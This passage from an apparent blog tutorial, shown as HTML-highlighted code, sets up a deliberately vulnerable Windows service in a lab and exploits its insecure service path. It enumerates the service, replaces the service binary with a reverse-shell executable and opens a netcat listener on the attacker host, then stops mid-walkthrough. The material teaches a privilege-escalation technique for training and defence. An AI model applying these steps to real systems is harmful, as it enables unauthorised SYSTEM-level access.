</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">&gt;</span><span class="nb">sc </span><span class="n">create</span> <span class="s2">&#34;Unquoted VulnService&#34;</span> <span class="n">binpath</span><span class="p">=</span> <span class="s2">&#34;C:\Program Files\Unquoted Path Service\VulnService.exe&#34;</span> <span class="n">type</span><span class="p">=</span> <span class="n">own</span> <span class="n">displayname</span><span class="p">=</span> <span class="s2">&#34;Unquoted Path Service&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">SC</span><span class="p">]</span> <span class="n">CreateService</span> <span class="n">SUCCESS</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">&gt;</span><span class="nb">sc </span><span class="n">qc</span> <span class="s2">&#34;Unquoted VulnService&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">SC</span><span class="p">]</span> <span class="n">QueryServiceConfig</span> <span class="n">SUCCESS</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">SERVICE_NAME</span><span class="err">:</span> <span class="n">Unquoted</span> <span class="n">VulnService</span>
</span></span><span class="line"><span class="cl">        <span class="nb">TYPE </span>              <span class="err">:</span> <span class="mf">10</span>  <span class="n">WIN32_OWN_PROCESS</span>
</span></span><span class="line"><span class="cl">        <span class="n">START_TYPE</span>         <span class="err">:</span> <span class="mf">3</span>   <span class="n">DEMAND_START</span>
</span></span><span class="line"><span class="cl">        <span class="n">ERROR_CONTROL</span>      <span class="err">:</span> <span class="mf">1</span>   <span class="n">NORMAL</span>
</span></span><span class="line"><span class="cl">        <span class="n">BINARY_PATH_NAME</span>   <span class="err">:</span> <span class="n">C:</span><span class="p">\</span><span class="n">Program</span> <span class="n">Files</span><span class="p">\</span><span class="n">Unquoted</span> <span class="n">Path</span> <span class="n">Service</span><span class="p">\</span><span class="n">VulnService</span><span class="p">.</span><span class="py">exe</span>
</span></span><span class="line"><span class="cl">        <span class="n">LOAD_ORDER_GROUP</span>   <span class="err">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">TAG</span>                <span class="err">:</span> <span class="mf">0</span>
</span></span><span class="line"><span class="cl">        <span class="n">DISPLAY_NAME</span>       <span class="err">:</span> <span class="n">Unquoted</span> <span class="n">Path</span> <span class="n">Service</span>
</span></span><span class="line"><span class="cl">        <span class="n">DEPENDENCIES</span>       <span class="err">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_START_NAME</span> <span class="err">:</span> <span class="n">LocalSystem</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>Note: To create a quoted path we must add &ldquo;\ at the start of the binpath value. Example: &ldquo;&quot;C:\Path To\Executablee&rdquo;&rdquo; or &ldquo;&quot;C:\Path To\Executable&rdquo;&quot;.</p>
<p>If we just add a value like &ldquo;C:\Path To\Executable&rdquo; then the service will be unquoted.</p>
</blockquote>
<p>Set the service access rights:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">&gt;</span><span class="nb">sc </span><span class="n">sdset</span> <span class="s2">&#34;Unquoted VulnService&#34;</span> <span class="s2">&#34;D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;RPWPLCRCCCLOSW;;;WD)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">SC</span><span class="p">]</span> <span class="n">SetServiceObjectSecurity</span> <span class="n">SUCCESS</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Start the service:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">&gt;</span><span class="nb">sc start </span><span class="s2">&#34;Unquoted VulnService&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">SERVICE_NAME</span><span class="err">:</span> <span class="n">Unquoted</span> <span class="n">VulnService</span>
</span></span><span class="line"><span class="cl">        <span class="nb">TYPE </span>              <span class="err">:</span> <span class="mf">10</span>  <span class="n">WIN32_OWN_PROCESS</span>
</span></span><span class="line"><span class="cl">        <span class="n">STATE</span>              <span class="err">:</span> <span class="mf">2</span>  <span class="n">START_PENDING</span>
</span></span><span class="line"><span class="cl">                                <span class="p">(</span><span class="n">NOT_STOPPABLE</span><span class="p">,</span> <span class="n">NOT_PAUSABLE</span><span class="p">,</span> <span class="n">IGNORES_SHUTDOWN</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">WIN32_EXIT_CODE</span>    <span class="err">:</span> <span class="mf">0</span>  <span class="p">(</span><span class="n">0x0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_EXIT_CODE</span>  <span class="err">:</span> <span class="mf">0</span>  <span class="p">(</span><span class="n">0x0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">CHECKPOINT</span>         <span class="err">:</span> <span class="n">0x0</span>
</span></span><span class="line"><span class="cl">        <span class="n">WAIT_HINT</span>          <span class="err">:</span> <span class="n">0x7d0</span>
</span></span><span class="line"><span class="cl">        <span class="n">PID</span>                <span class="err">:</span> <span class="mf">3740</span>
</span></span><span class="line"><span class="cl">        <span class="n">FLAGS</span>              <span class="err">:</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="privilege-escalation-3">Privilege Escalation</h2>
<p>Let&rsquo;s verify if we have permission to restart the service:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span><span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">\</span><span class="n">SysInternalsSuite</span><span class="p">\</span><span class="n">accesschk</span><span class="p">.</span><span class="py">exe</span> <span class="p">/</span><span class="n">accepteula</span> <span class="n">-uwcqv</span> <span class="n">user</span> <span class="s2">&#34;Unquoted VulnService&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Accesschk</span> <span class="n">v6</span><span class="p">.</span><span class="py">14</span> <span class="p">-</span> <span class="n">Reports</span> <span class="n">effective</span> <span class="n">permissions</span> <span class="k">for</span> <span class="n">securable</span> <span class="n">objects</span>
</span></span><span class="line"><span class="cl"><span class="n">Copyright</span> <span class="err">⌐</span> <span class="mf">2006</span><span class="p">-</span><span class="mf">2021</span> <span class="n">Mark</span> <span class="n">Russinovich</span>
</span></span><span class="line"><span class="cl"><span class="n">Sysinternals</span> <span class="p">-</span> <span class="n">www</span><span class="p">.</span><span class="py">sysinternals</span><span class="p">.</span><span class="py">com</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">RW</span> <span class="n">Unquoted</span> <span class="n">VulnService</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_ALL_ACCESS</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>There are two main ways that we can see the path of the executable of a service. The first method is by enumerating the <strong>BINARY_PATH_NAME</strong> configuration and the second method is by enumerating the registry key <strong>ImagePath</strong>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span><span class="nb">sc </span><span class="n">qc</span> <span class="s2">&#34;Unquoted VulnService&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">SC</span><span class="p">]</span> <span class="n">QueryServiceConfig</span> <span class="n">SUCCESS</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">SERVICE_NAME</span><span class="err">:</span> <span class="n">Unquoted</span> <span class="n">VulnService</span>
</span></span><span class="line"><span class="cl">        <span class="nb">TYPE </span>              <span class="err">:</span> <span class="mf">10</span>  <span class="n">WIN32_OWN_PROCESS</span>
</span></span><span class="line"><span class="cl">        <span class="n">START_TYPE</span>         <span class="err">:</span> <span class="mf">3</span>   <span class="n">DEMAND_START</span>
</span></span><span class="line"><span class="cl">        <span class="n">ERROR_CONTROL</span>      <span class="err">:</span> <span class="mf">1</span>   <span class="n">NORMAL</span>
</span></span><span class="line"><span class="cl">        <span class="n">BINARY_PATH_NAME</span>   <span class="err">:</span> <span class="n">C:</span><span class="p">\</span><span class="n">Program</span> <span class="n">Files</span><span class="p">\</span><span class="n">Unquoted</span> <span class="n">Path</span> <span class="n">Service</span><span class="p">\</span><span class="n">VulnService</span><span class="p">.</span><span class="py">exe</span>
</span></span><span class="line"><span class="cl">        <span class="n">LOAD_ORDER_GROUP</span>   <span class="err">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">TAG</span>                <span class="err">:</span> <span class="mf">0</span>
</span></span><span class="line"><span class="cl">        <span class="n">DISPLAY_NAME</span>       <span class="err">:</span> <span class="n">Unquoted</span> <span class="n">Path</span> <span class="n">Service</span>
</span></span><span class="line"><span class="cl">        <span class="n">DEPENDENCIES</span>       <span class="err">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_START_NAME</span> <span class="err">:</span> <span class="n">LocalSystem</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span><span class="n">reg</span> <span class="n">query</span> <span class="s2">&#34;HKLM\System\CurrentControlSet\services\Unquoted VulnService&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">HKEY_LOCAL_MACHINE</span><span class="p">\</span><span class="n">System</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">services</span><span class="p">\</span><span class="n">Unquoted</span> <span class="n">VulnService</span>
</span></span><span class="line"><span class="cl">    <span class="nb">Type </span>   <span class="n">REG_DWORD</span>    <span class="n">0x10</span>
</span></span><span class="line"><span class="cl">    <span class="nb">Start </span>   <span class="n">REG_DWORD</span>    <span class="n">0x3</span>
</span></span><span class="line"><span class="cl">    <span class="n">ErrorControl</span>    <span class="n">REG_DWORD</span>    <span class="n">0x1</span>
</span></span><span class="line"><span class="cl">    <span class="n">ImagePath</span>    <span class="n">REG_EXPAND_SZ</span>    <span class="n">C:</span><span class="p">\</span><span class="n">Program</span> <span class="n">Files</span><span class="p">\</span><span class="n">Unquoted</span> <span class="n">Path</span> <span class="n">Service</span><span class="p">\</span><span class="n">VulnService</span><span class="p">.</span><span class="py">exe</span>
</span></span><span class="line"><span class="cl">    <span class="n">DisplayName</span>    <span class="n">REG_SZ</span>    <span class="n">Unquoted</span> <span class="n">Path</span> <span class="n">Service</span>
</span></span><span class="line"><span class="cl">    <span class="n">ObjectName</span>    <span class="n">REG_SZ</span>    <span class="n">LocalSystem</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">HKEY_LOCAL_MACHINE</span><span class="p">\</span><span class="n">System</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">services</span><span class="p">\</span><span class="n">Unquoted</span> <span class="n">VulnService</span><span class="p">\</span><span class="n">Security</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can use wmic to find services and use <code>findstr</code> to filter what we want and what we don&rsquo;t want:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span><span class="n">wmic</span> <span class="n">service</span> <span class="n">get</span> <span class="n">name</span><span class="p">,</span><span class="n">displayname</span><span class="p">,</span><span class="n">pathname</span><span class="p">,</span><span class="n">startmode</span> <span class="p">|</span> <span class="n">findstr</span> <span class="p">/</span><span class="n">i</span> <span class="p">/</span><span class="n">v</span> <span class="s2">&#34;C:\\Windows\\system32\\&#34;</span> <span class="p">|</span><span class="n">findstr</span> <span class="p">/</span><span class="n">i</span> <span class="p">/</span><span class="n">v</span> <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">DisplayName                                                                         Name                                      PathName                                                                                                                        StartMode
</span></span></span><span class="line"><span class="cl"><span class="s2">LSM                                                                                 LSM                                                                                                                                                                       Unknown
</span></span></span><span class="line"><span class="cl"><span class="s2">NetSetupSvc                                                                         NetSetupSvc                                                                                                                                                               Unknown
</span></span></span><span class="line"><span class="cl"><span class="s2">Net.Tcp Port Sharing Service                                                        NetTcpPortSharing                         C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                                                   Disabled
</span></span></span><span class="line"><span class="cl"><span class="s2">Performance Counter DLL Host                                                        PerfHost                                  C:\Windows\SysWow64\perfhost.exe                                                                                                Manual
</span></span></span><span class="line"><span class="cl"><span class="s2">RemoteMouseService                                                                  RemoteMouseService                        C:\Program Files (x86)\Remote Mouse\RemoteMouseService.exe                                                                      Auto
</span></span></span><span class="line"><span class="cl"><span class="s2">Windows Modules Installer                                                           TrustedInstaller                          C:\Windows\servicing\TrustedInstaller.exe                                                                                       Auto
</span></span></span><span class="line"><span class="cl"><span class="s2">VulnService                                                                         VulnService                               C:\Users\user\Desktop\VulnService\VulnService\bin\Debug\VulnService.exe                                                         Manual
</span></span></span><span class="line"><span class="cl"><span class="s2">Unquoted Path Service                                                               Unquoted VulnService                      C:\Program Files\Unquoted Path Service\VulnService.exe                                                                          Manual
</span></span></span></code></pre></td></tr></table>
</div>
</div><figure><a class="lightgallery" href="/images/posts/unquoted-path-service.png" title="/images/posts/unquoted-path-service.png" data-thumbnail="/images/posts/unquoted-path-service.png" data-sub-html="<h2>Unquoted Path Service</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/images/posts/unquoted-path-service.png"
            data-srcset="/images/posts/unquoted-path-service.png, /images/posts/unquoted-path-service.png 1.5x, /images/posts/unquoted-path-service.png 2x"
            data-sizes="auto"
            alt="/images/posts/unquoted-path-service.png" />
    </a><figcaption class="image-caption">Unquoted Path Service</figcaption>
    </figure>
<p>Alternatively, we can list all the unquoted service paths with PowerShell (minus built-in Windows services):</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PS C:<span class="se">\T</span>ools&gt; gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode <span class="p">|</span> Where <span class="o">{</span><span class="nv">$_</span>.StartMode -eq <span class="s2">&#34;Auto&#34;</span> -and <span class="nv">$_</span>.PathName -notlike <span class="s2">&#34;C:\Windows*&#34;</span> -and <span class="nv">$_</span>.PathName -notlike <span class="s1">&#39;&#34;*&#39;</span><span class="o">}</span> <span class="p">|</span> <span class="k">select</span> PathName,DisplayName,Name
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PathName                                                   DisplayName        Name
</span></span><span class="line"><span class="cl">--------                                                   -----------        ----
</span></span><span class="line"><span class="cl">C:<span class="se">\P</span>rogram Files <span class="o">(</span>x86<span class="o">)</span><span class="se">\R</span>emote Mouse<span class="se">\R</span>emoteMouseService.exe RemoteMouseService RemoteMouseService
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PS C:<span class="se">\T</span>ools&gt; gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode <span class="p">|</span> Where <span class="o">{</span><span class="nv">$_</span>.StartMode -eq <span class="s2">&#34;Manual&#34;</span> -and <span class="nv">$_</span>.PathName -notlike <span class="s2">&#34;C:\Windows*&#34;</span> -and <span class="nv">$_</span>.PathName -notlike <span class="s1">&#39;&#34;*&#39;</span><span class="o">}</span> <span class="p">|</span> <span class="k">select</span> PathName,DisplayName,Name
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PathName                                                                DisplayName           Name
</span></span><span class="line"><span class="cl">--------                                                                -----------           ----
</span></span><span class="line"><span class="cl">C:<span class="se">\U</span>sers<span class="se">\u</span>ser<span class="se">\D</span>esktop<span class="se">\V</span>ulnService<span class="se">\V</span>ulnService<span class="se">\b</span>in<span class="se">\D</span>ebug<span class="se">\V</span>ulnService.exe VulnService           Vu...
</span></span><span class="line"><span class="cl">C:<span class="se">\P</span>rogram Files<span class="se">\U</span>nquoted Path Service<span class="se">\V</span>ulnService.exe                  Unquoted Path Service Un...
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>Note: We may want to change the start mode: StartMode -eq &ldquo;Manual&rdquo;</p>
</blockquote>
<p>As we can see it is not enclosed with quotes. Let&rsquo;s verify if we can restart the service:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">\</span><span class="n">SysInternalsSuite</span><span class="p">\</span><span class="n">accesschk</span><span class="p">.</span><span class="py">exe</span> <span class="p">/</span><span class="n">accepteula</span> <span class="n">-uvqc</span> <span class="s2">&#34;Insecure VulnService Executable&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now we&rsquo;ll need to verify if we have to write permissions in any of these directories:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span><span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">\</span><span class="n">SysInternalsSuite</span><span class="p">\</span><span class="n">accesschk</span><span class="p">.</span><span class="py">exe</span> <span class="p">/</span><span class="n">accepteula</span> <span class="n">-uwdq</span> <span class="s2">&#34;C:\Program Files\Unquoted Path Service\&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Accesschk</span> <span class="n">v6</span><span class="p">.</span><span class="py">14</span> <span class="p">-</span> <span class="n">Reports</span> <span class="n">effective</span> <span class="n">permissions</span> <span class="k">for</span> <span class="n">securable</span> <span class="n">objects</span>
</span></span><span class="line"><span class="cl"><span class="n">Copyright</span> <span class="err">⌐</span> <span class="mf">2006</span><span class="p">-</span><span class="mf">2021</span> <span class="n">Mark</span> <span class="n">Russinovich</span>
</span></span><span class="line"><span class="cl"><span class="n">Sysinternals</span> <span class="p">-</span> <span class="n">www</span><span class="p">.</span><span class="py">sysinternals</span><span class="p">.</span><span class="py">com</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Program</span> <span class="n">Files</span><span class="p">\</span><span class="n">Unquoted</span> <span class="n">Path</span> <span class="n">Service</span>
</span></span><span class="line"><span class="cl">  <span class="n">RW</span> <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">Authenticated</span> <span class="n">Users</span>
</span></span><span class="line"><span class="cl">  <span class="n">RW</span> <span class="n">NT</span> <span class="n">SERVICE</span><span class="p">\</span><span class="n">TrustedInstaller</span>
</span></span><span class="line"><span class="cl">  <span class="n">RW</span> <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">SYSTEM</span>
</span></span><span class="line"><span class="cl">  <span class="n">RW</span> <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Stop the service:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span><span class="nb">sc </span><span class="n">stop</span> <span class="s2">&#34;Unquoted VulnService&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">SERVICE_NAME</span><span class="err">:</span> <span class="n">Unquoted</span> <span class="n">VulnService</span>
</span></span><span class="line"><span class="cl">        <span class="nb">TYPE </span>              <span class="err">:</span> <span class="mf">10</span>  <span class="n">WIN32_OWN_PROCESS</span>
</span></span><span class="line"><span class="cl">        <span class="n">STATE</span>              <span class="err">:</span> <span class="mf">3</span>  <span class="n">STOP_PENDING</span>
</span></span><span class="line"><span class="cl">                                <span class="p">(</span><span class="n">STOPPABLE</span><span class="p">,</span> <span class="n">NOT_PAUSABLE</span><span class="p">,</span> <span class="n">ACCEPTS_SHUTDOWN</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">WIN32_EXIT_CODE</span>    <span class="err">:</span> <span class="mf">0</span>  <span class="p">(</span><span class="n">0x0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_EXIT_CODE</span>  <span class="err">:</span> <span class="mf">0</span>  <span class="p">(</span><span class="n">0x0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">CHECKPOINT</span>         <span class="err">:</span> <span class="n">0x0</span>
</span></span><span class="line"><span class="cl">        <span class="n">WAIT_HINT</span>          <span class="err">:</span> <span class="n">0x0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span><span class="nb">sc </span><span class="n">qc</span> <span class="s2">&#34;Unquoted VulnService&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">SC</span><span class="p">]</span> <span class="n">QueryServiceConfig</span> <span class="n">SUCCESS</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">SERVICE_NAME</span><span class="err">:</span> <span class="n">Unquoted</span> <span class="n">VulnService</span>
</span></span><span class="line"><span class="cl">        <span class="nb">TYPE </span>              <span class="err">:</span> <span class="mf">10</span>  <span class="n">WIN32_OWN_PROCESS</span>
</span></span><span class="line"><span class="cl">        <span class="n">START_TYPE</span>         <span class="err">:</span> <span class="mf">3</span>   <span class="n">DEMAND_START</span>
</span></span><span class="line"><span class="cl">        <span class="n">ERROR_CONTROL</span>      <span class="err">:</span> <span class="mf">1</span>   <span class="n">NORMAL</span>
</span></span><span class="line"><span class="cl">        <span class="n">BINARY_PATH_NAME</span>   <span class="err">:</span> <span class="n">C:</span><span class="p">\</span><span class="n">Program</span> <span class="n">Files</span><span class="p">\</span><span class="n">Unquoted</span> <span class="n">Path</span> <span class="n">Service</span><span class="p">\</span><span class="n">VulnService</span><span class="p">.</span><span class="py">exe</span>
</span></span><span class="line"><span class="cl">        <span class="n">LOAD_ORDER_GROUP</span>   <span class="err">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">TAG</span>                <span class="err">:</span> <span class="mf">0</span>
</span></span><span class="line"><span class="cl">        <span class="n">DISPLAY_NAME</span>       <span class="err">:</span> <span class="n">Unquoted</span> <span class="n">Path</span> <span class="n">Service</span>
</span></span><span class="line"><span class="cl">        <span class="n">DEPENDENCIES</span>       <span class="err">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_START_NAME</span> <span class="err">:</span> <span class="n">LocalSystem</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Since we have write permissions, we can add our executable in this directory:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span><span class="nb">copy </span><span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">\</span><span class="n">reverse</span><span class="p">.</span><span class="py">exe</span> <span class="s2">&#34;C:\Program Files\Unquoted Path Service\VulnService.exe&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">Overwrite</span> <span class="n">C:</span><span class="p">\</span><span class="n">Program</span> <span class="n">Files</span><span class="p">\</span><span class="n">Unquoted</span> <span class="n">Path</span> <span class="n">Service</span><span class="p">\</span><span class="n">VulnService</span><span class="p">.</span><span class="n">exe</span><span class="p">?</span> <span class="p">(</span><span class="n">Yes</span><span class="p">/</span><span class="n">No</span><span class="p">/</span><span class="n">All</span><span class="p">)</span><span class="err">:</span> <span class="n">Yes</span>
</span></span><span class="line"><span class="cl">        <span class="mf">1</span> <span class="n">file</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="n">copied</span><span class="p">.</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Set up a listener in the attacker host:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nc -lvnp <span class="m">443</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Restart the service:</p>
<div class="highlight"><div class="chroma">
